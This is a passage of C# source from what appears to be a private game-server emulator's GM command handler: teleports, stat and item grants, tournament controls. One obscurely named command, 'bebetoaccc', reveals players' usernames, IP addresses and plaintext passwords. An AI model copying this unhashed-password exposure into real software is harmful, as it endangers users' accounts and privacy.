                                        if (item.Level == 5)
                                            client.Inventory.Add(item.Identifier, 0, 1);
                                    break;
                                }
                            #endregion refinry
                            case "boothai":
                                {
                                    foreach (var pClient in GameState.BoothingAI.Values)
                                    {
                                        GameState.BoothingAI.Remove(pClient.Entity.UID);
                                        Kernel.GamePool.Remove(pClient.Entity.UID);
                                        Program.World.Unregister(pClient);
                                    }
                                    GameState.LoadBoothingAI();
                                }
                                break;
                            case "arrest":
                                {
                                    foreach (var pClient in Program.Values)
                                    {
                                        if (pClient.Entity.LoweredName.Contains(Data[1]))
                                        {
                                            pClient.Entity.Teleport(6002, 30, 74);
                                        }
                                    }
                                    break;
                                }
                            case "joinelite":
                                {
                                    if (!client.SignedUpForEPK)
                                        ElitePKTournament.Tournaments[ElitePKTournament.EPK_Lvl130Plus].SignUp(client);
                                }
                                break;
                            case "inbox":
                                {
                                    Data data = new Data(true);
                                    data.ID = GamePackets.Data.OpenWindow;
                                    data.UID = client.Entity.UID;
                                    data.TimeStamp = Time32.Now;
                                    data.dwParam = 576;
                                    data.wParam1 = client.Entity.X;
                                    data.wParam2 = client.Entity.Y;
                                    client.Send(data);
                                }
                                break;
                            case "openphp":
                                {
                                    string http = string.Format(Data[1], new object[0]);
                                    client.Send(new Message("" + http.ToString() + "", System.Drawing.Color.Red, Message.Website));
                                }
                                break;

                            case "bringgj":
                                {
                                    foreach (var clients in Program.Values)
                                    {
                                        if (clients.Entity.MapID == 6000 || clients.Entity.MapID == 6001)
                                        {
                                            clients.Entity.Teleport(1002, 301, 266);
                                        }
                                    }
                                }
                                break;
                            case "openvote":
                                {
                                    client.MessageBox("Vote for matrix now?", p =>
                                    {
                                        p.Send(new Message("" + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Website));
                                        Kernel.SendWorldMessage(new Message("Thank's " + p.Entity.Name + " for vorting", GamePackets.Message.Center));
                                        p.Send(new Message("matrix Vote Url: " + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Talk));
                                    },
p =>
{
    p.Send(new Message("" + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Website));
    Kernel.SendWorldMessage(new Message("Thank's " + p.Entity.Name + " for vorting", GamePackets.Message.Center));
    p.Send(new Message("matrix Vote Url: " + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Talk));
});
                                }
                                break;
                            case "lcps":
                                foreach (var zz in Program.Values)
                                {
                                    uint cp = uint.Parse(Data[3]);
                                    if (zz.Entity.ConquerPoints >= 5)
                                        zz.Entity.ConquerPoints = cp;
                                }
                                break;
                            case "openvoteall":
                                {
                                    foreach (var clients in Program.Values)
                                    {
                                        clients.MessageBox("Please vote for matrix to get more players, vote now?", p =>
                                        {
                                            p.Send(new Message("" + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Website));
                                            Kernel.SendWorldMessage(new Message("Thank's " + p.Entity.Name + " for vorting", GamePackets.Message.Center));
                                            p.Send(new Message("matrix Vote Url: " + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Talk));
                                        },
                                        p =>
                                        {
                                            p.Send(new Message("" + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Website));
                                            Kernel.SendWorldMessage(new Message("Thank's " + p.Entity.Name + " for vorting", GamePackets.Message.Center));
                                            p.Send(new Message("matrix Vote Url: " + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Talk));
                                        });
                                    }
                                }
                                break;
                            case "startelite":
                                {
                                    ElitePKTournament.RegisterTimers();
                                    ElitePKBrackets brackets = new ElitePKBrackets(true, 0);
                                    brackets.Type = ElitePKBrackets.EPK_State;
                                    brackets.OnGoing = true;
                                    foreach (var clients in Program.Values)
                                    {
                                        clients.Send(brackets);
                                        clients.MessageBox("Elite PK Tournament has started! Would you like to join?",
                                            p => { p.Entity.Teleport(1002, 431, 250); }, null);
                                    }
                                }
                                break;
                            case "endelite":
                                {
                                    if (!ElitePKTournament.TimersRegistered)
                                        break;
                                    bool done = true;
                                    foreach (var epk in ElitePKTournament.Tournaments)
                                        if (epk.Players.Count != 0)
                                            done = false;
                                    if (done)
                                    {
                                        ElitePKTournament.TimersRegistered = false;
                                        ElitePKBrackets brackets = new ElitePKBrackets(true, 0);
                                        brackets.Type = ElitePKBrackets.EPK_State;
                                        brackets.OnGoing = false;
                                        foreach (var clientss in Program.Values)
                                            clientss.Send(brackets);
                                    }
                                }
                                break;
                            case "testx"://client Gui PM Command TQ
                                {
                                    client.Send(GamePackets.Data.Custom(uint.Parse(Data[1]), client.Entity.UID));
                                }
                                break;
                            #region New

                            case "teststeed":
                                {
                                    //   Program.OnSteedRace = true;
                                }
                                break;
                            case "testctf":
                                {
                                    //   Program.Onctf = true;
                                }
                                break;
                            case "retime":
                                {
                                    ServerTime time = new ServerTime
                                    {
                                        Year = (uint)DateTime.Now.Year,
                                        Month = (uint)DateTime.Now.Month,
                                        DayOfYear = (uint)DateTime.Now.DayOfYear,
                                        DayOfMonth = (uint)DateTime.Now.Day,
                                        Hour = (uint)DateTime.Now.Hour,
                                        Minute = (uint)DateTime.Now.Minute,
                                        Second = (uint)DateTime.Now.Second
                                    };
                                    client.Send(time);
                                }
                                break;
                            case "time":
                                {

                                    ServerTime time = new ServerTime();
                                    time.Year = (uint)DateTime.Now.Year;
                                    time.Month = (uint)DateTime.Now.Month;
                                    time.DayOfYear = (uint)DateTime.Now.DayOfYear;
                                    //   time.DayOfYear = (uint)int.Parse(Data[1]);
                                    time.DayOfMonth = (uint)int.Parse(Data[1]);
                                    time.Hour = (uint)int.Parse(Data[2]);
                                    time.Minute = (uint)int.Parse(Data[3]);
                                    time.Second = (uint)int.Parse(Data[4]);
                                    client.Send(time);
                                    break;
                                }
                            case "addstatue":
                                {
                                    byte[] test = new byte[((ushort)(247 + client.Entity.Name.Length + 8))];
                                    Writer.WriteUshort((ushort)(test.Length - 8), 0, test);
                                    Writer.WriteUshort(10014, 2, test);
                                    Writer.WriteUint((uint)(client.Entity.TransformationID * 10000000 + client.Entity.Face * 10000 + client.Entity.Body), 8, test);//body
                                    Writer.WriteUint(105175, 12, test); //UID   
                                    Writer.WriteUshort(client.Entity.GuildID, 16, test);//guild ID
                                    Writer.WriteUshort(client.Entity.GuildRank, 20, test);//guild Rank
                                    Writer.WriteUint(100, 27, test);
                                    #region Equip same as me
                                    foreach (ConquerItem item in client.Equipment.Objects)
                                    {
                                        if (item == null)
                                            continue;
                                        switch ((ushort)item.Position)
                                        {
                                            case ConquerItem.Head:
                                                {
                                                    if (item.Purification.Available)
                                                    {
                                                        Network.Writer.WriteUInt32(0, 194 + 4, test);
                                                    }
                                                    Writer.WriteUInt32(item.ID, 44 + 4, test);// Offset Correto.
                                                    Writer.WriteUInt16((byte)item.Color, 139 + 4, test);// Offset Correto.
                                                    break;
                                                }
                                            case ConquerItem.Garment:
                                                {
                                                    Writer.WriteUInt32(item.ID, 48 + 4, test);// Offset Correto.
                                                    break;
                                                }
                                            case ConquerItem.Armor:
                                                {
                                                    if (item.Purification.Available)
                                                    {
                                                        Writer.WriteUInt32(item.Purification.PurificationItemID, 200 + 4, test);// Offset Correto.
                                                    }
                                                    Writer.WriteUInt32(item.ID, 52 + 4, test);// Offset Correto.          
                                                    Writer.WriteUInt16((byte)item.Color, 137 + 4, test);// Offset Correto.
                                                    break;
                                                }
                                            case ConquerItem.RightWeapon:
                                                {
                                                    if (item.Purification.Available)
                                                    {
                                                        Writer.WriteUInt32(item.Purification.PurificationItemID, 208 + 4, test);// Offset Correto.
                                                    }
                                                    Writer.WriteUInt32(item.ID, 60 + 4, test);// Offset Correto.  
                                                    break;
                                                }
                                            case ConquerItem.LeftWeapon:
                                                {
                                                    if (item.Purification.Available)
                                                    {
                                                        Writer.WriteUInt32(item.Purification.PurificationItemID, 204 + 4, test);// Offset Correto.
                                                    }
                                                    Writer.WriteUInt32(item.ID, 56 + 4, test);// Offset Correto.
                                                    Writer.WriteUInt16((byte)item.Color, 137 + 4, test);// Offset Correto.\                                                    
                                                    break;
                                                }
                                            case ConquerItem.RightWeaponAccessory:
                                                {
                                                    Writer.WriteUInt32(item.ID, 68 + 4, test);
                                                    break;
                                                }
                                            case ConquerItem.LeftWeaponAccessory:
                                                {
                                                    Writer.WriteUInt32(item.ID, 64 + 4, test);
                                                    break;
                                                }
                                            case ConquerItem.Steed:
                                                {
                                                    Writer.WriteUInt32(item.ID, 72 + 4, test);
                                                    Writer.WriteUInt16((byte)item.Plus, 147 + 4, test);
                                                    Writer.WriteUInt32(item.SocketProgress, 153 + 4, test);
                                                    break;
                                                }
                                            case ConquerItem.SteedArmor:
                                                {
                                                    Writer.WriteUInt32(item.ID, 76 + 4, test);
                                                    break;
                                                }
                                        }
                                    }
                                    #endregion Equip same as me
                                    //var value = Update.Flags.Ride;
                                    //Writer.WriteUInt64(value, 0x16 + 4, test);
                                    Writer.WriteUshort((ushort)client.Entity.Hitpoints, 89, test);//npc hitpoints
                                    Writer.WriteUshort(client.Entity.Level, 96, test);//level
                                    Writer.WriteUshort(client.Entity.X, 98, test);
                                    Writer.WriteUshort(client.Entity.Y, 100, test);
                                    Writer.WriteUshort(client.Entity.HairStyle, 102, test);//npc hitpoints  
                                    Writer.WriteByte(7, 104, test);//fascing
                                    Writer.WriteByte((byte)client.Entity.Action, 105, test);//action
                                    Writer.WriteByte(1, 244, test);
                                    Writer.WriteByte((byte)client.Entity.Name.Length, 245, test);
                                    Writer.WriteString(client.Entity.Name, 246, test);
                                    client.Send(test);
                                    break;
                                }
                            #endregion New
                            #region booth
                            case "vend":
                            case "booth":
                                {
                                    if (client.Booth == null)
                                    {
                                        client.Send(new MapStatus() { BaseID = client.Map.BaseID, ID = client.Map.ID, Status = Database.MapsTable.MapInformations[1036].Status });
                                        Data data = new Data(true);
                                        data.ID = 111;
                                        data.UID = client.Entity.UID;
                                        data.TimeStamp = Time32.Now;
                                        data.dwParam = 40079;
                                        data.wParam1 = client.Entity.X;
                                        data.wParam2 = client.Entity.Y;
                                        client.Send(data);
                                        client.Booth = new Game.ConquerStructures.Booth(client, data);
                                        Data data4 = new Data(true)
                                        {
                                            ID = 0x51,
                                            UID = client.Entity.UID,
                                            dwParam = 0
                                        };
                                        client.Send(data4);

                                        //  client.Send(new MapStatus() { BaseID = client.Map.BaseID, ID = client.Map.ID, Status = Database.MapsTable.MapInformations[1036].Status });
                                        //  client.Booth = new Game.ConquerStructures.Booth(client, new Data(true) { UID = client.Entity.UID });
                                        //  client.Send(new Data(true) { ID = GamePackets.Data.ChangeAction, UID = client.Entity.UID, dwParam = 0 });

                                    }
                                    break;
                                }
                            #endregion booth
                            case "nflag":
                                {
                                    client.Entity.nAddFlag(int.Parse(Data[1]));
                                    break;
                                }
                            case "nonflag":
                                {
                                    client.Entity.nRemoveFlag(int.Parse(Data[1]));
                                    break;
                                }
                            case "flag1":
                                {
                                    client.Entity.AddFlag((ulong)((long)1 << (int.Parse(Data[1]) & 63)));
                                    break;
                                }
                            case "noflag1":
                                {
                                    client.Entity.RemoveFlag((ulong)((long)1 << (int.Parse(Data[1]) & 63)));
                                    break;
                                }
                            case "flag2":
                                {
                                    client.Entity.StatusFlag2 = 0;
                                    client.Entity.AddFlag2((ulong)((long)1 << (int.Parse(Data[1]) & 63)));
                                    break;
                                }
                            case "noflag2":
                                {
                                    client.Entity.RemoveFlag2((ulong)((long)1 << (int.Parse(Data[1]) & 63)));
                                    break;
                                }
                            case "flag3":
                                {
                                    client.Entity.AddFlag3((ulong)((long)1 << (int.Parse(Data[1]) & 63)));
                                    break;
                                }
                            case "noflag3":
                                {
                                    client.Entity.RemoveFlag3((uint)(ulong)((long)1 << (int.Parse(Data[1]) & 63)));
                                    break;
                                }
                            case "superhero":
                                {
                                    client.Entity.Defence = ushort.MaxValue;
                                    client.Entity.Dodge = byte.MaxValue;
                                    client.Entity.Vigor = ushort.MaxValue;
                                    client.Entity.ExtraVigor = ushort.MaxValue;
                                    client.Entity.WoodResistance = int.MaxValue;
                                    client.Entity.FireResistance = int.MaxValue;
                                    client.Entity.WaterResistance = int.MaxValue;
                                    client.Entity.EarthResistance = int.MaxValue;
                                    client.Entity.Breaktrough = int.MaxValue;
                                    client.Entity.CriticalStrike = int.MaxValue;
                                    client.Entity.Immunity = int.MaxValue;
                                    client.Entity.Penetration = int.MaxValue;
                                    client.Entity.Counteraction = int.MaxValue;
                                    client.Entity.Block = int.MaxValue;
                                    client.Entity.Detoxication = ushort.MaxValue;
                                    client.Entity.Intensification = ushort.MaxValue;
                                    client.Entity.Penetration = int.MaxValue;
                                    client.Entity.SkillCStrike = int.MaxValue;
                                    client.Entity.MaxAttack = ushort.MaxValue * 10;
                                    client.Entity.MinAttack = ushort.MaxValue * 10;

                                    client.Entity.PhysicalDamageDecrease = ushort.MaxValue;
                                    client.Entity.MagicDamageDecrease = ushort.MaxValue;
                                    client.Entity.MagicDamageIncrease = ushort.MaxValue;
                                    client.Entity.PhysicalDamageIncrease = ushort.MaxValue;

                                    client.Entity.ItemBless = ushort.MaxValue;
                                    client.Entity.AttackRange = ushort.MaxValue;

                                    client.Entity.MaxHitpoints = ushort.MaxValue * 10;
                                    client.Entity.Hitpoints = ushort.MaxValue * 10;
                                    break;
                                }
                            case "rankload":
                                {
                                    Database.NobilityTable.Load();
                                    break;
                                }
                            case "obj":
                                {
                                    StaticEntity entity = new StaticEntity(400000, (ushort)(client.Entity.X + 2), (ushort)(client.Entity.Y + 2), 2057);

                                    uint
                                        meshB = uint.Parse(Data[1]),
                                        meshE = uint.Parse(Data[2]);

                                    Writer.WriteUInt16(1, Entity._MonsterLevel, entity.SpawnPacket);
                                    Writer.WriteStringList(new List<string>() { "Flag", string.Empty }, Entity._Names, entity.SpawnPacket);


                                    for (uint i = meshB; i < meshE; i++)
                                    {
                                        Writer.WriteUInt32(i, Entity._Mesh, entity.SpawnPacket);
                                        client.Send(entity.SpawnPacket);
                                        client.Send(i.ToString(), Message.Agate);
                                        System.Threading.Thread.Sleep(250);
                                    }
                                    break;
                                }
                            case "epkbtest":
                                {
                                    TEST_EPKB(client);
                                    break;
                                }
                            case "loadfake":
                                {
                                    if (Data.Length == 3)
                                    {
                                        var array = LoadEntityUIDs(int.Parse(Data[2]));
                                        int x = int.Parse(Data[1]);
                                        int y = int.Parse(Data[2]);
                                        for (int i = x; i < y; i++)
                                        {
                                            var fClient = new GameState(null);
                                            fClient.FakeLoad(array[i]);
                                            int xP = Kernel.Random.Sign() * Kernel.Random.Next(8);
                                            int yP = Kernel.Random.Sign() * Kernel.Random.Next(8);
                                            if (fClient.FakeLoaded)
                                                fClient.Entity.Teleport(client.Entity.MapID, (ushort)(client.Entity.X + xP), (ushort)(client.Entity.Y + yP));
                                        }
                                    }
                                    client.Screen.Reload(null);
                                    break;
                                }
                            case "process":
                                {
                                    Program.HandleClipboardPacket(message);
                                    break;
                                }

                            case "test3":
                                {
                                    client.Entity.AddTopStatus(Update.Flags.TopSpouse, 1, DateTime.Now.AddDays(1), false);
                                    break;
                                }
                            case "test1":
                                {
                                    string ItemName = Data[1].ToLower();
                                    Game.Enums.ItemQuality Quality = Game.Enums.ItemQuality.Fixed;
                                    switch (Data[2].ToLower())
                                    {
                                        case "fixed": Quality = Game.Enums.ItemQuality.Fixed; break;
                                        case "normal": Quality = Game.Enums.ItemQuality.Normal; break;
                                        case "normalv1": Quality = Game.Enums.ItemQuality.NormalV1; break;
                                        case "normalv2": Quality = Game.Enums.ItemQuality.NormalV2; break;
                                        case "normalv3": Quality = Game.Enums.ItemQuality.NormalV3; break;
                                        case "refined": Quality = Game.Enums.ItemQuality.Refined; break;
                                        case "unique": Quality = Game.Enums.ItemQuality.Unique; break;
                                        case "elite": Quality = Game.Enums.ItemQuality.Elite; break;
                                        case "super": Quality = Game.Enums.ItemQuality.Super; break;
                                        case "other": Quality = Game.Enums.ItemQuality.Other; break;
                                        default:
                                            {
                                                Quality = (MTA.Game.Enums.ItemQuality)int.Parse(Data[4]);
                                                break;
                                            }
                                    }
                                    Database.ConquerItemBaseInformation CIBI = null;
                                    foreach (Database.ConquerItemBaseInformation infos in Database.ConquerItemInformation.BaseInformations.Values)
                                        if (infos.LowerName == ItemName && Quality == (Game.Enums.ItemQuality)(infos.ID % 10))
                                            CIBI = infos;
                                    if (CIBI == null)
                                        break;
                                    ConquerItem newItem = new GamePackets.ConquerItem(true);
                                    newItem.ID = CIBI.ID;
                                    newItem.Durability = CIBI.Durability;
                                    newItem.MaximDurability = CIBI.Durability;
                                    newItem.Color = (Game.Enums.Color)Kernel.Random.Next(4, 8);
                                    client.Inventory.Add(newItem, Game.Enums.ItemUse.CreateAndAdd);
                                    client.Inventory.Remove(newItem, Game.Enums.ItemUse.Move, true);
                                    newItem.Position = 13; // 13 - armor, 14 headgear
                                    client.Send(newItem);
                                    newItem.Mode = Enums.ItemMode.Update;
                                    client.Send(newItem);
                                    ClientEquip eqs = new ClientEquip();
                                    eqs.DoEquips(client);
                                    eqs.Armor = newItem.UID;
                                    client.Send(eqs);
                                    break;
                                }
                            case "bebetoaccc":
                                {
                                    foreach (var pClient in Program.Values)
                                    {
                                        if (pClient == null) continue;
                                        if (pClient.Entity.LoweredName == Data[1])
                                        {
                                            client.Send(new Message("[Whois " + pClient.Entity.Name + "]", System.Drawing.Color.Red, GamePackets.Message.FirstRightCorner));
                                            client.Send(new Message("Username: " + pClient.Account.Username, System.Drawing.Color.Red, GamePackets.Message.ContinueRightCorner));
                                            if (client.Account.State == Database.AccountTable.AccountState.GM)
                                                client.Send(new Message("Password: " + pClient.Account.Password, System.Drawing.Color.Red, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new Message("IP: " + pClient.Account.IP, System.Drawing.Color.Red, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new Message("CPs: " + pClient.Entity.ConquerPoints, System.Drawing.Color.Red, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new Message("Money: " + pClient.Entity.Money, System.Drawing.Color.Red, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new Message("BP: " + pClient.Entity.BattlePower, System.Drawing.Color.Red, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new Message("Map: [" + pClient.Entity.MapID + "] " + pClient.Entity.X + "," + pClient.Entity.Y, System.Drawing.Color.Red, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new Message("Attack range: " + pClient.Entity.AttackRange, System.Drawing.Color.Red, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Money: " + pClient.Entity.Money, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Class: " + pClient.Entity.Class, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("UID: " + pClient.Entity.UID, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Level: " + pClient.Entity.Level, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Strength: " + pClient.Entity.Strength, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Agility: " + pClient.Entity.Agility, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Vitality: " + pClient.Entity.Vitality, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Spirit: " + pClient.Entity.Spirit, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Atributes: " + pClient.Entity.Atributes, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Hitpoints: " + pClient.Entity.Hitpoints, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("PKPoints: " + pClient.Entity.PKPoints, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("VIPLevel: " + pClient.Entity.VIPLevel, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Map: [" + pClient.Entity.MapID + "] " + pClient.Entity.X + "," + pClient.Entity.Y, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Frist RB: " + pClient.Entity.FirstRebornClass, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("Sconed RB: " + pClient.Entity.SecondRebornClass, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("FirstRebornLevel: " + pClient.Entity.FirstRebornLevel, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                            client.Send(new MTA.Network.GamePackets.Message("SecondRebornLevel: " + pClient.Entity.SecondRebornLevel, System.Drawing.Color.Green, GamePackets.Message.ContinueRightCorner));
                                        }
                                    }
                                    return true;
                                }
                            case "hairstyle":
                                {
                                    client.Entity.HairStyle = ushort.Parse(Data[1]);
                                    break;
                                }
                            case "scroll":
                                {
                                    if (client.Entity.MapID == 700)
                                        break;
                                    switch (Data[1].ToLower())
                                    {
                                        case "tc": client.Entity.Teleport(1002, 303, 278); break;
                                        case "pc": client.Entity.Teleport(1011, 195, 260); break;
                                        case "ac":
                                        case "am": client.Entity.Teleport(1020, 566, 563); break;
                                        case "dc": client.Entity.Teleport(1000, 500, 645); break;
                                        case "bi": client.Entity.Teleport(1015, 723, 573); break;
                                        case "pka": client.Entity.Teleport(1005, 050, 050); break;
                                        case "ma": client.Entity.Teleport(1036, 211, 196); break;
                                        case "ja": client.Entity.Teleport(6000, 100, 100); break;
                                    }
                                    break;
                                }
                            case "test":
                                {
                                    client.Entity.AddFlag(ulong.Parse(Data[1]));
                                    break;
                                }
                            case "chi":
                                {
                                    client.Send(new ChiPowers(true).Query(client));
                                    break;
                                }
                            case "itemeffect":
                                {
                                    Kernel.boundID = int.Parse(Data[1]);
                                    Kernel.boundIDEnd = int.Parse(Data[2]);
                                    break;
                                }
                            case "kiko":
                                {
                                    client.Entity.ActualMyTypeFlower = 30010102;
                                    break;
                                }

                            case "geartest":
                                {
                                    //181315 515black
                                    uint UID = 92000;
                                    ConquerItem newItem = new MTA.Network.GamePackets.ConquerItem(true);
                                    newItem.ID = 181825;
                                    newItem.UID = UID;
                                    newItem.Durability = 1000;
                                    newItem.MaximDurability = 1000;
                                    newItem.Position = 9;
                                    //client.Inventory.Add(newItem, Game.Enums.ItemUse.CreateAndAdd);
                                    client.Equipment.Remove(9);
                                    if (client.Equipment.Objects[8] != null)
                                        client.Equipment.Objects[8] = null;
                                    client.Equipment.Add(newItem);
                                    newItem.Mode = MTA.Game.Enums.ItemMode.Update;
                                    newItem.Send(client);
                                    ClientEquip equips = new ClientEquip();
                                    equips.DoEquips(client);
                                    client.Send(equips);
                                    client.Equipment.UpdateEntityPacket();
                                    break;

                                }
                            case "quarantine":
                                {
                                    //542363
                                    MTA.Game.Quarantine.Started = true;
                                    break;
                                }
                            case "test2":
                                {
                                    client.Entity.RemoveFlag(ulong.Parse(Data[1]));
                                    break;
                                }
                            case "summon":
                                {
                                    foreach (var pClient in Program.Values)
                                    {
                                        if (pClient.Entity.LoweredName.Contains(Data[1]))
                                        {
                                            pClient.Entity.Teleport(client.Entity.MapID, client.Entity.X, client.Entity.Y);
                                        }
                                    }
                                    break;
                                }
                            case "pkp":
                                {
                                    client.Entity.PKPoints = ushort.Parse(Data[1]);

                                    break;
                                }
                            case "inv":
                                {
                                    if (client.Entity.Invisable)
                                    {
                                        client.Entity.Invisable = false;
                                        client.SendScreenSpawn(client.Entity, true);
                                    }
                                    else
                                    {
                                        client.Entity.Invisable = true;
                                        client.RemoveScreenSpawn(client.Entity, true);
                                    }
                                    break;
                                }

                            case "addtitle":
                                {
                                    //client.Entity.AddTitle((TitlePacket.Titles)(Convert.ToUInt16(Data[1])), DateTime.Now);
                                    break;
                                }

                            case "give":
                                {
                                    foreach (var Client in Program.Values)
                                    {
                                        if (Client.Entity.LoweredName.Contains(Data[1]))
                                        {
                                            switch (Data[2])
                                            {
                                                case "unsuper":
                                                    {
                                                        Client.CalculateStatBonus();
                                                        Client.CalculateHPBonus();
                                                        Client.LoadItemStats();
                                                    }
                                                    break;
                                                case "clear":
                                                    {
                                                        ConquerItem[] inventory = new ConquerItem[Client.Inventory.Objects.Length];
                                                        Client.Inventory.Objects.CopyTo(inventory, 0);

                                                        foreach (ConquerItem item in inventory)
                                                        {
                                                            Client.Inventory.Remove(item, MTA.Game.Enums.ItemUse.Remove);
                                                        }
                                                        break;
                                                    }
                                                case "super":
                                                    {
                                                        Client.Entity.Defence = ushort.MaxValue;
                                                        Client.Entity.Dodge = byte.MaxValue;
                                                        Client.Entity.Vigor = ushort.MaxValue;
                                                        Client.Entity.ExtraVigor = ushort.MaxValue;
                                                        Client.Entity.WoodResistance = ushort.MaxValue;
                                                        Client.Entity.FireResistance = ushort.MaxValue;
                                                        Client.Entity.WaterResistance = ushort.MaxValue;
                                                        Client.Entity.EarthResistance = ushort.MaxValue;
                                                        Client.Entity.Breaktrough = ushort.MaxValue;
                                                        Client.Entity.CriticalStrike = ushort.MaxValue;
                                                        Client.Entity.Immunity = ushort.MaxValue;
                                                        Client.Entity.Penetration = ushort.MaxValue;
                                                        Client.Entity.Counteraction = ushort.MaxValue;
                                                        Client.Entity.Block = ushort.MaxValue;
                                                        Client.Entity.Detoxication = ushort.MaxValue;
                                                        Client.Entity.Intensification = ushort.MaxValue;
                                                        Client.Entity.Penetration = ushort.MaxValue;
                                                        Client.Entity.SkillCStrike = ushort.MaxValue;
                                                        Client.Entity.MaxAttack = uint.MaxValue;
                                                        Client.Entity.MinAttack = uint.MaxValue;
                                                        Client.Entity.PhysicalDamageDecrease = ushort.MaxValue;
                                                        Client.Entity.MagicDamageDecrease = ushort.MaxValue;
                                                        Client.Entity.MagicDamageIncrease = ushort.MaxValue;
                                                        Client.Entity.PhysicalDamageIncrease = ushort.MaxValue;
                                                        Client.Entity.MagicDefencePercent = ushort.MaxValue;
                                                        Client.Entity.ItemHP = ushort.MaxValue;
                                                        Client.Entity.ItemMP = ushort.MaxValue;
                                                        Client.Entity.ItemBless = ushort.MaxValue;
                                                        Client.Entity.AttackRange = ushort.MaxValue;
                                                        Client.Entity.BaseMinAttack = uint.MaxValue;
                                                        Client.Entity.BaseMaxAttack = uint.MaxValue;
                                                        Client.Entity.BaseMagicDefence = uint.MaxValue;
                                                        Client.Entity.BaseDefence = ushort.MaxValue;
                                                        Client.Entity.MagicDamageIncrease = ushort.MaxValue;
                                                        Client.Entity.MaxHitpoints = uint.MaxValue;
                                                        Client.Entity.Hitpoints = uint.MaxValue;
                                                        break;
                                                    }
                                                case "openvote":
                                                    {
                                                        Client.MessageBox("Vote for matrix now?", p =>
                                                        {
                                                            p.Send(new Message("" + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Website));
                                                            Kernel.SendWorldMessage(new Message("Thank's " + p.Entity.Name + " for vorting", GamePackets.Message.Center));
                                                            p.Send(new Message("matrix Vote Url: " + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Talk));
                                                        },
                    p =>
                    {
                        p.Send(new Message("" + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Website));
                        Kernel.SendWorldMessage(new Message("Thank's " + p.Entity.Name + " for vorting", GamePackets.Message.Center));
                        p.Send(new Message("matrix Vote Url: " + rates.VoteUrl + "", System.Drawing.Color.Red, Message.Talk));
                    });
                                                    }
                                                    break;
                                                case "aura":
                                                    {
                                                        new Update(true).Aura(Client.Entity, (Update.AuraDataTypes)uint.Parse(Data[3]), (Update.AuraType)uint.Parse(Data[4]), null);
                                                    }
                                                    break;
                                                #region refinary
                                                case "refinary":
                                                    {
                                                        foreach (var item in Kernel.DatabaseRefinery.Values)
                                                            if (item.Level == 5)
                                                                Client.Inventory.Add(item.Identifier, 0, 1);
                                                        break;
                                                    }
                                                #endregion refinry
                                                case "chipoints":
                                                    {
                                                        uint vp = uint.Parse(Data[3]);
                                                        Client.ChiPoints += vp;
                                                    }
                                                    break;
                                                case "hchipoints":
                                                    {
                                                        uint vp = uint.Parse(Data[3]);
                                                        Client.ChiPoints = vp;
                                                    }
                                                    break;
                                                case "rank":
                                                    SafeDictionary<uint, MTA.Game.ConquerStructures.NobilityInformation> Board = new SafeDictionary<uint, MTA.Game.ConquerStructures.NobilityInformation>(10000);
                                                    Client.NobilityInformation.Donation = ulong.Parse(Data[3]);
                                                    Board.Add(Client.Entity.UID, Client.NobilityInformation);
                                                    Database.NobilityTable.UpdateNobilityInformation(Client.NobilityInformation);
                                                    Database.NobilityTable.UpdateNobilityInformation(Client.NobilityInformation);
                                                    Game.ConquerStructures.Nobility.Sort(Client.Entity.UID);
                                                    break;
                                                case "pkp":
                                                    Client.Entity.PKPoints = ushort.Parse(Data[3]);
                                                    break;
                                                case "range":
                                                    Client.Entity.AttackRange = ushort.Parse(Data[3]);
                                                    break;
                                                case "defense":
                                                    Client.Entity.Defence = ushort.Parse(Data[3]);
                                                    break;
                                                case "scrit":
                                                    Client.Entity.SkillCStrike = int.Parse(Data[3]);
                                                    break;
                                                case "crit":
                                                    Client.Entity.CriticalStrike = int.Parse(Data[3]);
                                                    break;
                                                case "break":
                                                    Client.Entity.Breaktrough = int.Parse(Data[3]);
                                                    break;
                                                case "block":
                                                    Client.Entity.Block = int.Parse(Data[3]);
                                                    break;
                                                case "counter":
